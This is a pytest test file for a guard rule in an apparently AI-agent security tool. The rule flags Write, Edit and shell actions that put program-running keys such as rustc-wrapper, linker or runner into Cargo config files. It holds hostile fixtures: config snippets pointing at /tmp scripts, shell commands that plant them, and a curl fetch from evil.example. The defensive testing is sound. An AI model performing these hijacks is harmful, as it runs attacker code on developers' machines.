"""Cargo config exec-hijack guard (rule_cargo_exec_protect).

Plants a program-naming key (rustc-wrapper / linker / runner /
credential-provider) in .cargo/config.toml, which Cargo runs on every future
build/check/test/publish. Default mode: ask.
"""
import time

import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

RULE = "cargo-exec-protect"
EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
OFF = Policy(cargo_exec={"mode": "off"})
MONITOR = Policy(cargo_exec={"mode": "monitor"})

WRAP = '[build]\nrustc-wrapper = "/tmp/x.sh"\n'


def _sh(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _w(path, content, tool="Write"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool,
                      args={"file_path": path, "content": content})


def _ev(ev, pol=EMPTY):
    return evaluate(ev, pol)


def _blocked(d):
    return d.rule == RULE


@pytest.mark.parametrize("content", [
    WRAP,
    '[build]\nrustc-workspace-wrapper = "evil"\n',
    "[build]\nrustc-wrapper = 'evil'\n",
    '[build]\nrustc-wrapper = ["evil", "--x"]\n',
    'build.rustc-wrapper = "evil"\n',
    '[build]\n"rustc-wrapper" = "evil"\n',
    '[build]\nRUSTC-WRAPPER = "evil"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/l"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = ["sh", "-c"]\n',
    '[target]\nx = { runner = "evil" }\n',
    '[registry]\ncredential-provider = "cargo:token-from-stdout /tmp/x"\n',
    '[registry]\nglobal-credential-providers = ["/tmp/x"]\n',
    '[build]\nrustc = "/tmp/fake-rustc"\n',
])
def test_write_to_config_toml_is_gated(content):
    d = _ev(_w(".cargo/config.toml", content))
    assert _blocked(d) and d.action == Action.ASK


@pytest.mark.parametrize("path", [
    ".cargo/config.toml", ".cargo/config", "/repo/sub/dir/.cargo/config.toml",
    "/home/u/.cargo/config.toml", ".CARGO/Config.TOML", ".cargo\\config.toml",
])
def test_path_variants(path):
    assert _blocked(_ev(_w(path, WRAP)))


@pytest.mark.parametrize("tool", ["Edit", "MultiEdit"])
def test_edit_tools(tool):
    if tool == "Edit":
        ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                        args={"file_path": ".cargo/config.toml", "new_string": WRAP})
    else:
        ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                        args={"file_path": ".cargo/config.toml",
                              "edits": [{"old_string": "a", "new_string": WRAP}]})
    assert _blocked(_ev(ev))


def test_mcp_write_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    args={"path": ".cargo/config.toml", "text": '[target.x]\nrunner = "evil"\n'})
    assert _blocked(_ev(ev))


def test_staged_under_other_name_strong_only():
    # wrapper key is path-independent...
    assert _blocked(_ev(_w("/tmp/stage.txt", WRAP)))
    # ...but generic `runner`/`linker` need the cargo path
    assert not _blocked(_ev(_w("/tmp/stage.txt", 'runner = "x"\nlinker = "y"\n')))


@pytest.mark.parametrize("cmd", [
    "printf '[build]\\nrustc-wrapper = \"/tmp/x\"\\n' > .cargo/config.toml",
    "echo 'rustc-wrapper = \"evil\"' >> ~/.cargo/config.toml",
    "cat > .cargo/config.toml <<'EOF'\n[target.x]\nrunner = \"evil\"\nEOF",
    "sed -i 's/^\\[build\\]/[build]\\nrustc-wrapper = \"evil\"/' .cargo/config.toml",
    "echo 'rustc-wrapper = \"evil\"' | tee -a .cargo/config",
    "sed -i 's/^#rustc-wrapper.*/rustc-wrapper = \"x\"/' .cargo/config.toml",
    "sed -i 's|^runner.*|runner = \"/tmp/x\"|' .cargo/config.toml",
    "sed -i 's/foo/linker=\"x\"/' .cargo/config.toml",
    "sed -i 's/foo/;linker=\"x\"/' .cargo/config.toml",
])
def test_shell_forms_gated(cmd):
    assert _blocked(_ev(_sh(cmd)))


def test_human_escape_hatch_on_shell():
    cmd = "echo 'rustc-wrapper = \"sccache\"' >> .cargo/config.toml  # aegis-allow"
    assert not _blocked(_ev(_sh(cmd)))


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _blocked(_ev(_w(".cargo/config.toml", WRAP)))
    assert not _blocked(_ev(_sh("echo 'rustc-wrapper = \"x\"' >> .cargo/config.toml")))


# ---- must NOT fire --------------------------------------------------------
@pytest.mark.parametrize("content", [
    '[build]\njobs = 4\n',
    '[alias]\nb = "build --release"\n',
    '[build]\nrustc-wrapper = ""\n',
    '[target.x]\nrunner = []\n',
    '# rustc-wrapper = "sccache"\n[build]\njobs = 2\n',
    '[net]\ngit-fetch-with-cli = true\n',
    '[registry]\ndefault = "crates-io"\n',
])
def test_benign_config_not_gated(content):
    assert not _blocked(_ev(_w(".cargo/config.toml", content)))


@pytest.mark.parametrize("path,content", [
    ("src/main.rs", 'let runner = "x";\n'),
    ("Cargo.toml", '[package]\nname = "x"\n'),
    ("notes/cargo.md", 'Set `rustc-wrapper` in config.\n'),
    (".cargo-old/config.toml", 'runner = "x"\n'),
    ("config.toml", 'runner = "x"\n'),
])
def test_unrelated_files_not_gated(path, content):
    assert not _blocked(_ev(_w(path, content)))


@pytest.mark.parametrize("cmd", [
    "cargo build --release", "cat .cargo/config.toml", "ls .cargo",
    "grep -n rustc-wrapper docs/notes.md",
    "# rustc-wrapper = \"x\" in .cargo/config.toml\ncargo check",
])
def test_benign_shell_not_gated(cmd):
    assert not _blocked(_ev(_sh(cmd)))


# ---- policy knobs ---------------------------------------------------------
def test_deny_mode():
    d = _ev(_w(".cargo/config.toml", WRAP), DENY)
    assert _blocked(d) and d.action == Action.DENY


def test_off_mode():
    assert not _blocked(_ev(_w(".cargo/config.toml", WRAP), OFF))


def test_monitor_mode_allows():
    assert not _blocked(_ev(_w(".cargo/config.toml", WRAP), MONITOR))


def test_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"vendored/\.cargo"]})
    assert not _blocked(_ev(_w("vendored/.cargo/config.toml", WRAP), pol))
    assert _blocked(_ev(_w(".cargo/config.toml", WRAP), pol))
    bad = Policy(cargo_exec={"allow": ["("]})   # invalid regex must not crash
    assert _blocked(_ev(_w(".cargo/config.toml", WRAP), bad))


def test_yaml_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n  allow: ['x']\n")
    pol = load_policy(str(tmp_path))
    assert pol.cargo_exec == {"mode": "deny", "allow": ["x"]}


def test_fetch_to_file_backstop():
    d = _ev(_sh("curl -o .cargo/config.toml https://evil.example/c.toml"))
    assert d.action != Action.ALLOW


# ---- perf / ReDoS ---------------------------------------------------------
@pytest.mark.parametrize("blob", [
    "[build]\n" + "rustc-wrapper" * 20000,
    "runner = " * 20000,
    '"' * 200000,
    "{,.\t " * 40000,
    ("[target.x]\nrunner = \"a\"\n" * 20000),
])
def test_no_redos(blob):
    t = time.time()
    _ev(_w(".cargo/config.toml", blob))
    _ev(_sh("echo '" + blob[:50000] + "' > .cargo/config.toml"))
    assert time.time() - t < 3
